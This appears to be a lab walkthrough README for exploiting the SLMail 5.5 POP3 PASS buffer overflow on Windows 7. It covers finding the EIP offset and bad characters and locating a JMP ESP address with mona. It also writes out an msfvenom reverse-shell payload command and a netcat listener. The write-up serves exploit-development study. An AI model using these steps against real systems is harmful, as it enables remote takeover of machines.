# Remote-buffer-overflow

Windows exploitation using Remote buffer overflow vulnerability of Seatle Lab mail 5.5 
=====================================================================================

Remote buffer overflow on POP3 'PASS'of Seatle Lab mail 5.5
Windows x86 vulnerability (https://www.exploit-db.com/exploits/638)

Tools/ configuration used
-------------------------
Windows 7 32 bit
Kali linux 2020
VMware
Seatle Lab mail 5.5 (vulnerable software)(https://slmail.software.informer.com/5.5/)
Immunity debugger (python)  	(https://www.immunityinc.com/products/debugger/index.html)
mona.py				(https://github.com/corelan/mona)


------------------------------------------------
On windows 7:

Install Immuinity debugger(with python)
Copy mona.py to pyCommands folder located at Immunity debugger installation directory 
Install Seatle Lab mail 5.5 with default configuration

To ignore unwanted interuption:
	Disable firewall protection
	Stop automatic update
	Disconnect internet (set Host-only network connection)

Note Windows 7 ip=> (eg. 192.168.220.132)
port => 110

On Linux PC:

Six python script (intermediate) files used to create final exploitation python file
a0.py		to identify buffer overflow filled with 'A's
a1.py		to fill with pattern of characters to identify EIP location and buffer offset size
a2.py		to ensure to control EIP with 'B's
bad1.py		to Identify bad characters(01) with all possible values (to ignore in shellcode) 
bad2.py		to Identify bad characters(02) with all possible values (to ignore in shellcode) 
bad3.py		to Identify bad characters(03) with all possible values (to ignore in shellcode) 
(bad... if necessary)

xploit.py	Final exploitation script

--------------------------------------------------
On windows PC

start Seatle Lab mail
start Immunity Debugger 
attach Seatle Lab mail 

-------------------------------------------------
Create an array of buffer with 'A's

==> run a0.py with arguments (Target IP and PORT)
(Eg. python a0.py 192.168.220.132 110)

crashed @ 2900

EIP overwritten with AAAA (41414141) 	(observe on Immunity Debugger)

start Seatle Lab mail
start Immunity Debugger 
attach Seatle Lab mail 

--------------------------------------------------
Created unique pattern with a1.py to identify the location of EIP

>>>locate pattern_create
copy & paste ruby script with length of 2700
(/usr/share/metasploit-framsework/tools/exploit/pattern_create.rb -l 2700)

==> run a1.py with arguments (Target IP and PORT)

EIP overwritten with value		(observe on Immunity Debugger)
locate and copy EIP value on DBG (eg. 39694438)

>>>locate pattern_offset
copy & paste ruby script with EIP value
(/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438)

Note the offset exact match value (eg. 2606)

start Seatle Lab mail
start Immunity Debugger 
attach Seatle Lab mail 

--------------------------------------------------
 
Create a buffer pattern to ensure the EIP control
( 2606*A + 4*B + 90*C)
"A"s     EIP      Payload(shellcode)

==> run a2.py  with arguments (Target IP and PORT)

EIP overwritten with BBBB (42424242) 	(observe on Immunity Debugger)
Note that we can control the EIP

start Seatle Lab mail
start Immunity Debugger 
attach Seatle Lab mail  

----------------------------------------------------

Identify bad characters (01)
by sending all possible characters as payload part (skip \x00 -->common bad character)

==> run bad1.py with arguments (Target IP and PORT)

Identify firts missed bad character to skip in shellcode(eg. \x0a ) 

start Seatle Lab mail
start Immunity Debugger 
attach Seatle Lab mail  

------------------------------------------------------

Identify bad characters (02)
by sending all possible characters except identified character (\x00 & \x0a) as payload part

==> run bad2.py with arguments (Target IP and PORT)

Identify next missed bad character to skip in shellcode(eg. \x0d ) 

start Seatle Lab mail
start Immunity Debugger 
attach Seatle Lab mail  

------------------------------------------------------

Identify bad characters (03)
by sending all possible characters ecxept identified characters (\x00,\x0a & \x0d ) as payload part

==> run bad3.py with arguments (Target IP and PORT)

Identify next missed bad character to skip in shellcode(eg. no any character) 

start Seatle Lab mail 
(run exploit.py without Immunity DBG)

------------------------------------------------------

to create final exploitation script

get address of jmp ESP

>>>locate nasm_shell
copy & paste ruby script
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

	nasm> jmp esp
	note value to identify the address using mona script (eg. FFE4)

On immunity debugger run mona scripts
	
	!mona modules
		note the slmfc.ll file - false value with Rebase, safeSEH, ALSR & NXcompat

	!mona find -s "\xff\xe4" -m slmfc.dll (FFE4 copied from nasm shell)
		copy the address of one of the result
 
 ..........................

create shellcode using mfsvenom 	 

msfvenom -p windows/shell_reverse_tcp LHOST=<Target_ip_address> LPORT=<port> -f py -b '<bad Characters>' -e x86/shikata_ga_nai
(eg.
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.220.130 LPORT=443 -f py -b '\x00\x0a\x0d\' -e x86/shikata_ga_nai
)

create final overflow pattern 
	"A"s(offset size) + jmpESP (in little endian format) + nop sleds(\x90) + payload(shellcode)

EXPLOITAION:

open another terminal for netcat listener
==> nc -nlvp 443 
    (same port used in shellcode creation)

==> run exploit.py with arguments (Target IP and PORT)

DONE! GOT --> system reverse shell of target machine

References:
https://www.peerlyst.com/posts/hands-on-windows-exploit-development-stack-based-buffer-overflow-bof-chiheb-chebbi?trk=search_page_search_result
https://www.offensive-security.com/metasploit-unleashed/msfvenom/
http://sh3llc0d3r.com/exploit-development/
https://www.youtube.com/watch?v=OOkU7to0Ty4
https://stackoverflow.com/questions/5286117/incompatible-character-encodings-ascii-8bit-and-utf-8
